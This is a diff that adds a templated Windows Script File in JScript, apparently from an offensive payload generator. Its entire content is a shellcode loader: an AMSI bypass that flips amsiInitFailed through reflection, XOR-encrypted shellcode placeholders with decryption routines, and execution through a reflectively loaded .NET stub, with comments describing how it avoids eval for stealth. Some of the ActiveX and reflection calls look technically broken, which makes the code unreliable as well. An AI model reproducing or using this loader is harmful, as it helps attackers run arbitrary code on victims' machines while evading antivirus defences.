@@ -1,0 +1,54 @@
+<?xml version="1.0" encoding="utf-8"?>
+<package>
+<job id="{{ v.job_id }}">
+<script language="JScript">
+<![CDATA[
+// AMSI bypass via reflection (System.Management.Automation.AmsiUtils)
+function {{ v.fn_amsi }}() {
+    try {
+        var asm = new ActiveXObject("System.Reflection.Assembly");
+        var amsi = asm.GetType("System.Management.Automation.AmsiUtils");
+        if (amsi !== null) {
+            var f = amsi.GetField("amsiInitFailed", 36);  // NonPublic | Static
+            f.SetValue(null, true);
+        }
+    } catch (e) {}
+}
+
+// XOR-encrypted shellcode (multi-byte key)
+var {{ v.var_sc }} = "{{ shellcode_hex }}";
+var {{ v.var_key }} = "{{ key_hex }}";
+
+function {{ v.fn_hex2arr }}(h) {
+    var a = []; for (var i = 0; i < h.length; i += 2) {
+        a.push(parseInt(h.substr(i, 2), 16));
+    } return a;
+}
+
+function {{ v.fn_decrypt }}(data, key) {
+    var out = []; for (var i = 0; i < data.length; i++) {
+        out.push(data[i] ^ key[i % key.length]);
+    } return out;
+}
+
+// Execution via System.Reflection — no eval, no execScript
+function {{ v.fn_exec }}() {
+    {{ v.fn_amsi }}();
+    var sc  = {{ v.fn_decrypt }}({{ v.fn_hex2arr }}({{ v.var_sc }}), {{ v.fn_hex2arr }}({{ v.var_key }}));
+
+    var loader = new ActiveXObject("System.Reflection.Assembly");
+    // Load and invoke a tiny .NET stub that takes byte[] and runs it
+    var stub_hex = "{{ v.dotnet_stub_hex }}";
+    var stub_bytes = {{ v.fn_hex2arr }}(stub_hex);
+
+    var asm = loader.Load(stub_bytes);
+    var t   = asm.GetType("Stub.Loader");
+    var mi  = t.GetMethod("Run");
+    mi.Invoke(null, [sc]);
+}
+
+{{ v.fn_exec }}();
+]]>
+</script>
+</job>
+</package>
